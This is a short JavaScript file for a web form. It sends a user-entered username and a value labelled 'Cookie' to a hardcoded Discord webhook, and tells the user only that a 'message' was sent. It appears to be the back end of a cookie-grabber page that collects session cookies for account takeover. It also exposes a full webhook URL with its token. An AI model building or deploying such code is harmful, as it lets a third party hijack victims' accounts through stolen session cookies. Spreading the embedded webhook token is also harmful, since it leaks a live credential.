// script.js

document.getElementById('webhookForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const webhookUrl = 'https://discord.com/api/webhooks/1251342908150517830/UfLJSFjaZvRlUmnmo783glV2L2hUyca4HgD1nKpYxxNhsA2_i8TFg4j7cQtq2Pt0i_pH'; // Replace with your actual Discord webhook URL
    const username = document.getElementById('usernameBox').value;
    const message = document.getElementById('textBox').value;

    const discordMessage = `**Username:** ${username}\n**Cookie:** ${message}`;

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: discordMessage
        })
    }).then(response => {
        if(response.ok) {
            alert('Message sent successfully!');
        } else {
            alert('Error sending message.');
        }
    }).catch(error => {
        console.error('Error:', error);
        alert('Error sending message.');
    });
});
